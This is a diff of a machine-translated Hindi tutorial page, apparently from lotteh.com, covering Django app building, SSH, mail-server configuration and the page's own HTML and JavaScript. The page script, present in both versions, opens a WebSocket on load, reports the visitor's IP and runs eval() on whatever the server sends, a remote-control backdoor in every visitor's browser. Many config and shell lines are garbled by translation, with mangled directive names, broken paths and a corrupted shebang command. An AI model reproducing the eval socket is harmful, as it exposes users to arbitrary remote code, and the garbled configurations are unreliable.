@@ -430,7 +430,7 @@ def feed(request):
 
 अब हमें अपने ऐप को बेहतर बनाने की जरूरत है, क्योंकि अभी के लिए यह वास्तव में बुनियादी दिखता है। हम इसे CSS का उपयोग करके, या तो इनलाइन, या दस्तावेज़ में प्रत्येक ऑब्जेक्ट से जुड़ी कक्षाओं में कर सकते हैं। सीएसएस वास्तव में अच्छा है क्योंकि यह पृष्ठ पर सब कुछ बताता है कि यह कैसे दिखना चाहिए,और यह वास्तव में अच्छा लग सकता है। कुछ पुस्तकालय हैं जो ऐसा कर सकते हैं, लेकिन मेरा व्यक्तिगत जाना बूटस्ट्रैप है। 
 
-बूटस्ट्रैप को उनकी वेबसाइट से डाउनलोड किया जा सकता है,<a href="https://getbootstrap.com/" id="external-link" title="Visit this link (it will take you outside of Lotte Harper)">Getbootstrap.com/</a>। एक बार, इंस्टॉलेशन डॉक्स को पढ़ने के लिए बटन दबाएं, और CDN सेक्शन के माध्यम से शामिल कोड को कॉपी करें। आपको हेड नामक एक टैग में, अपने HTML दस्तावेज़ के शीर्ष पर इस कोड की आवश्यकता होगी। इसके अलावा, आइए आगे बढ़ें और एक बेस टेम्पलेट बनाएं ताकि हमें प्रत्येक टेम्पलेट में इन लिंक को फिर से बनाने की आवश्यकता न हो। 
+बूटस्ट्रैप को उनकी वेबसाइट से डाउनलोड किया जा सकता है,<a href="https://getbootstrap.com/" id="external-link" title="Visit this link (it will take you outside of Lotte Harper)">getbootstrap.com/</a>। एक बार, इंस्टॉलेशन डॉक्स को पढ़ने के लिए बटन दबाएं, और CDN सेक्शन के माध्यम से शामिल कोड को कॉपी करें। आपको हेड नामक एक टैग में, अपने HTML दस्तावेज़ के शीर्ष पर इस कोड की आवश्यकता होगी। इसके अलावा, आइए आगे बढ़ें और एक बेस टेम्पलेट बनाएं ताकि हमें प्रत्येक टेम्पलेट में इन लिंक को फिर से बनाने की आवश्यकता न हो। 
 
 MKDIR टेम्प्लेट के साथ टेम्प्लेट नामक एक नई निर्देशिका बनाएं, और फिर टेम्प्लेट/base.html को संपादित करें।
 
@@ -838,7 +838,7 @@ def activate(request, uidb64, token):
         user.profile.email_verified = True
         user.profile.save()
         user.save()
-# sendwelcomeemail (अनुरोध, उपयोगकर्ता)
+# Sendwelcomeemail (अनुरोध, उपयोगकर्ता)
         messages.success(request, f'Thanks for confirming your email! You can now log into your account, and a welcome email has been sent to you.')
         return redirect(user.profile.create_face_url())
     else:
@@ -1205,7 +1205,7 @@ class TfaForm(forms.Form):
         'code': 'Please enter the six digit code after sending it to your phone with the button above.'
     }
 </code></pre>अगला, आइए उपयोगकर्ताओं/विचारों में दृश्य बनाएं।<pre class="language-python"><code>
-# ... आयात
+# … राशियाँ
 from django.http import HttpResponseRedirect
 from .forms import PhoneNumberForm, TfaForm
 
@@ -1820,7 +1820,7 @@ def is_superuser_or_vendor(user):
       &lt;a href="{{ user|document_front }}" class="btn btn-sm btn-outline-primary" title="ID front"&gt;&lt;i class="bi bi-person-badge-fill"&gt;&lt;/i&gt; ID front&lt;/a&gt;
       &lt;a href="{{ user|document_back }}" class="btn btn-sm btn-outline-primary" title="ID back"&gt;&lt;i class="bi bi-upc-scan"&gt;&lt;/i&gt; ID back&lt;/a&gt;
       {% endif %}
-      &lt;small&gt;# {{User.id}} &lt;/small&gt;
+      &lt;small&gt;# {{user.id}} &lt;/small&gt;
       &lt;small&gt;{% if user.profile.subscribed %}Subscribed{% else %}Not subscribed{% endif %}&lt;/small&gt;
     &lt;/div&gt;
     {%if not user.is_superuser %}
@@ -1931,7 +1931,7 @@ nano sshd_config
 
 # प्रमाणीकरण:
 
-# Logringracetime 2m
+# Logingracetime 2m
 # परमिट्रोटलोगिन निषेध-पत्रकार
 # सख्ती
 # Maxauthtries 6
@@ -1992,7 +1992,7 @@ UsePAM yes
 X11Forwarding yes
 # X11DISPLAYOFFSET 10
 # X11uselocalhost हाँ
-# परमिट्टी हाँ
+# गोली हाँ
 PrintMotd no
 # PrintLastLog हाँ
 # Tcpkeepalive हाँ
@@ -2010,7 +2010,7 @@ PrintMotd no
 # कोई डिफ़ॉल्ट बैनर पथ नहीं
 Banner /etc/banner
 
-# ग्राहक को स्थानीय चर चर पास करने की अनुमति दें
+# क्लाइंट को लोकेल पर्यावरण चर पास करने की अनुमति दें
 AcceptEnv LANG LC_*
 
 # कोई सबसिस्टम का डिफ़ॉल्ट ओवरराइड करें
@@ -2062,7 +2062,7 @@ sudo nano /usr/bin/ascript
 # !
 if [ ! -f /usr/bin/$1 ]; then
     sudo touch /usr/bin/$1
-    echo "# !
+    echo "# /बिन/बैश "&gt;&gt;/usr/बिन/$ 1
     sudo chmod a+x /usr/bin/$1
     sudo nano /usr/bin/$1
     echo $1 | sudo tee -a /etc/ascripts
@@ -2228,7 +2228,7 @@ cd $DIR
 echo "Creating virtual environment"
 python -m venv venv
 source venv/bin/activate
-# निर्भरता प्राप्त करें और निर्माण करें
+# निर्भरताएं प्राप्त करें और निर्माण करें
 echo "Getting and building dependencies, this may take a whike"
 cd $DIR
 git clone https://github.com/sukhitashvili/violence-detection.git
@@ -2299,7 +2299,7 @@ sudo certbot --apache --non-interactive --agree-tos --domains femmebabe.com --em
 # डाक -सर्वर को पुनः लोड करें
 sudo systemctl restart opendkim postfix dovecot
 # COPY CERTS
-# Sudo cp /etc/lettesencrypt/live/femmebabe.com/privkey.pem privkey.pem
+# sudo cp /etc/letsencrypt/live/femmebabe.com/privkey.pem privkey.pem
 # sudo cp /etc/lettesencrypt/live/femmebabe.com/cert.pem cert.pem
 # पैबंद
 cp scripts/content.py $"/home/team/femmebabe/venv/lib/python${PYTHON_VERSION}/site-packages/pyxb/binding/content.py"
@@ -2408,8 +2408,8 @@ sudo a2enmod proxy_balancer
 sudo a2enmod proxy_http
 sudo a2enmod proxy_wstunnel
 # sudo a2dismod mpm_event
-# sudo a2dismod mpm_worker
-# sudo a2enmod mpm_prefork
+# Sudo a2dismod mpm_worker
+# Sudo a2enmod mpm_prefork
 # डिफ़ॉल्ट साइट अक्षम करें
 sudo a2dissite 000-default
 sudo a2dissite 000-default-le-ssl
@@ -2872,9 +2872,9 @@ nano config/etc_postfix_master.cf
 # ====================================================================== =============================
 smtp      inet  n       -       y       -       -       smtpd
 # smtp inet n - y - 1 पोस्टस्क्रीन
-# smtpd पास - - y - - smtpd
+# Smtpd पास - - y - - smtpd
 # DNSBLOG UNIX - - Y - 0 DNSBLOG
-# Tlsproxy Unix - - y - 0 tlsproxy
+# tlsproxy Unix - - y - 0 tlsproxy
 # एक चुनें: केवल लूपबैक क्लाइंट के लिए सबमिशन सक्षम करें, या किसी भी क्लाइंट के लिए।
 # 127.0.0.1:submission inet n - y - - smtpd
 submission inet n       -       y       -       -       smtpd
@@ -2907,14 +2907,14 @@ submission inet n       -       y       -       -       smtpd
 # -ओ smtpd_client_restrictions = $ mua_client_restrictions
 # -O SMTPD_HELO_RESTRICTIONS = $ MUA_HELO_RESTRICTIONS
 # -O SMTPD_SENDER_RESTRICTIONS = $ MUA_SENDER_RESTRICTIONS
-# -ओ SMTPD_RECIPIENT_RESTRICTIONS =
+# -ओ SMTPD_RECIPIENT_TRASTRICTIONS =
 # -O SMTPD_RELAY_RESTRICTIONS = PERMIT_SASL_AUTHENTICATED, अस्वीकार करें
 # -ओ milter_macro_daemon_name = मूल
 # 628 inet n - y - - qmqpd
 pickup    unix  n       -       y       60      1       pickup
 cleanup   unix  n       -       y       -       0       cleanup
 qmgr      unix  n       -       n       300     1       qmgr
-# QMGR UNIX N - N 300 1 OQMGR
+# QMGR UNIX N - N 300 1 OQMG
 tlsmgr    unix  -       -       y       1000?   1       tlsmgr
 rewrite   unix  -       -       y       -       -       trivial-rewrite
 bounce    unix  -       -       y       -       0       bounce
@@ -2959,7 +2959,7 @@ maildrop  unix  -       n       n       -       -       pipe
 # हाल के साइरस संस्करण मौजूदा "LMTP" मास्टर.सीएफ प्रविष्टि का उपयोग कर सकते हैं।
 # 
 # Cyrus.conf में निर्दिष्ट करें:
-# Lmtp cmd = "lmtpd -a" सुनो = "localhost: lmtp" proto = tcp4
+# lmtp cmd = "lmtpd -a" सुनो = "localhost: lmtp" proto = tcp4
 # 
 # निम्नलिखित में से एक या एक से अधिक में निर्दिष्ट करें:
 # Mailbox_transport = lmtp: inet: localhost
@@ -3068,7 +3068,7 @@ service imap-login {
   # Process_min_avail = 0
 
   # यदि आप service_count = 0 सेट करते हैं, तो आपको शायद इसे बढ़ाने की आवश्यकता है।
-  # Vsz_limi = $ default_vsz_limit
+  # vsz_limit = $ default_vsz_limit
 }
 
 service pop3-login {
@@ -3108,17 +3108,17 @@ service imap {
   # Vsz_limi = $ default_vsz_limit
 
   # अधिकतम। IMAP प्रक्रियाओं की संख्या (कनेक्शन)
-  # process_limit = 1024
+  # Process_limit = 1024
 }
 
 service pop3 {
   # अधिकतम। POP3 प्रक्रियाओं की संख्या (कनेक्शन)
-  # Process_limit = 1024
+  # process_limit = 1024
 }
 
 service submission {
   # अधिकतम। SMTP सबमिशन प्रक्रियाओं की संख्या (कनेक्शन)
-  # Process_limit = 1024
+  # process_limit = 1024
 }
 
 service auth {
@@ -3251,7 +3251,7 @@ nano config/etc_dovecot_dovecot
 # "प्रॉक्सी :: &lt;नाम&gt;"।
 
 dict {
-  # कोटा = mysql: /andc/dovecot/dovecot-dic-sql.conf.ext
+  # कोटा = mysql: /etc/dovecot/dovecot-dict-sql.conf.ext
 }
 
 # अधिकांश वास्तविक कॉन्फ़िगरेशन नीचे शामिल हैं। फ़ाइल नाम हैं
@@ -3358,7 +3358,7 @@ nano config/etc_default_opendkim
 # Daemon_opts = ""
 # UNIX सॉकेट का उपयोग करने के लिए/var/spool/postfix/run/opendkim में बदलें
 # एक chroot में पोस्टफिक्स:
-# Rundir =/was/spool/postfix/run/opendkim
+# Rundir =/var/spool/postfix/run/opendkim
 RUNDIR=/run/opendkim
 # 
 # एक वैकल्पिक सॉकेट निर्दिष्ट करने के लिए असंबद्ध
@@ -3547,7 +3547,7 @@ source venv/bin/activate
 
 
 
-<p><a href="https://lotteh.com/payments/photo/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="Buy on Lotte Harper">खरीदना</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">क्रिप्टो के साथ खरीदें</a></p>
+<p><a href="https://lotteh.com/payments/pay/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="Buy on Lotte Harper">खरीदना</a> | <a href="https://lotteh.com/payments/pay/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=USDC" title="Buy with cryptocurrency on Lotte Harper">क्रिप्टो के साथ खरीदें</a></p>
 
 
 <hr>
@@ -3587,7 +3587,7 @@ source venv/bin/activate
 
 
         
-        <p>
+        
 
 <div class="dropdown">
   <a class="btn btn-outline-info dropdown-toggle" role="button" id="dropdownMenuLink" data-bs-toggle="dropdown" aria-expanded="false">
@@ -3624,12 +3624,16 @@ source venv/bin/activate
     </div>
   </div>
 </div>
-</p>
+
         <p><i>मुझे इस पते का उपयोग करके बिटकॉइन में एक टिप छोड़ दें:</i> <b id="btc-wallet">3KhDWoSve2N627RiW8grj6XrsoPT7d6qyE</b> <button class="btn btn-sm btn-info" title="प्रतिलिपि पता" onclick="copyToClipboard('btc-wallet');">प्रतिलिपि</button></p>
+        <div id="javascript-console"></div>
 	    <div class="d-flex justify-content-between p-2">
 	        <div style="float:left;">
 	          <p><span class="badge bg-light text-dark shadow p-1">&copy; Glam Girl X 2025</span></p>
 		    </div>
+            <div style="text-align: center;">
+                 <a href="https://instagram.com/yourlocalfemme" about="_blank" title="मुझे इंस्टाग्राम पर जाएँ" style="font-size: 20px;" class="ml-1"><i class="bi bi-instagram"></i></a> <a href="https://twitter.com/teamfemmebabe" about="_blank" title="मुझे ट्विटर पर जाएँ" style="font-size: 20px;" class="ml-1"><i class="bi bi-twitter"></i></a> <a href="https://youtube.com/@daisymakeup" about="_blank" title="मुझे YouTube पर देखें" style="font-size: 20px;" class="ml-1"><i class="bi bi-youtube"></i></a>
+            </div>
 	        <div style="float:right;">
 	          <p><span class="badge bg-light text-dark shadow p-1"><a href="https://lotteh.com/terms/?lang=hi" title="सेवा की शर्तें देखें">सेवा की शर्तें</a></span></p>
 		    </div>
@@ -3672,32 +3676,32 @@ function jumpbookto(page) {
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("close", (event) => {
+            remoteSocket.addEventListener("close", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -3844,34 +3848,41 @@ if(document.getElementById("current-time")) {
             image.style.height = "100%";
             image.style.maxWidth = "160px";
             image.alt = "क्यूआर कोड को स्कैन करके इस पृष्ठ को साझा करें।";
-            function downloadQrImage(url, filename) {
-              const link = document.createElement('a');
-              link.href = url;
-              link.download = 'Glam Girl X - ' + filename;
-              document.body.appendChild(link);
-              link.classList.add('hide');
-              link.click();
-            }
-            function downloadQr() {
-                    downloadQrImage(image.src, 'QR Code');
-            }
-            qrdiv.onclick = downloadQr;
+            try {
+                function getBase64Image(img) {
+                    var src = img.src;
+                    var image = new Image();
+                    image.src = src;
+                    image.onload = function(event) {
+                    var bsfcanvas = document.createElement("canvas");
+                    bsfcanvas.width = img.clientWidth + 40;
+                    bsfcanvas.height = img.clientHeight + 40;
+                    if(bsfcanvas.height < bsfcanvas.width) bsfcanvas.height = bsfcanvas.width;
+                    var bsfctx = bsfcanvas.getContext("2d");
+                    bsfctx.fillStyle = "#ffffff";
+                    bsfctx.fillRect(0, 0, bsfcanvas.width, bsfcanvas.height);
+                    bsfctx.drawImage(event.target, 20, 20, bsfcanvas.width - 40, bsfcanvas.height - 40);
+                    var dataURL = bsfcanvas.toDataURL("image/png");
+                    downloadQrImage(dataURL, 'Glam Girl X - QR Code.png');
+                    };
+                }
+                function downloadQrImage(url, filename) {
+                    const link = document.createElement('a');
+                    link.download = filename;
+                    link.href = url;
+                    link.classList.add('hide');
+                    link.click();
+                }
+                function downloadQr(){
+                    var theQrImage = document.getElementById('shareqrcode').querySelector('img');
+                    getBase64Image(theQrImage);
+                }
+                qrdiv.onclick = downloadQr;
+                } catch(error) {
+                        document.getElementById('javascript-console').insertAdjacentHTML("beforeend", '<div>' + new String(error) + '</div>');
+                }
         });
     </script>
-    
-    <script async type="application/javascript"
-        src="https://news.google.com/swg/js/v1/swg-basic.js"></script>
-<script>
-  (self.SWG_BASIC = self.SWG_BASIC || []).push( basicSubscriptions => {
-    basicSubscriptions.init({
-      type: "NewsArticle",
-      isPartOfType: ["Product"],
-      isPartOfProductId: "CAowktDYCw:openaccess",
-      clientOptions: { theme: "light", lang: "en" },
-    });
-  });
-</script>
-
     
     
     
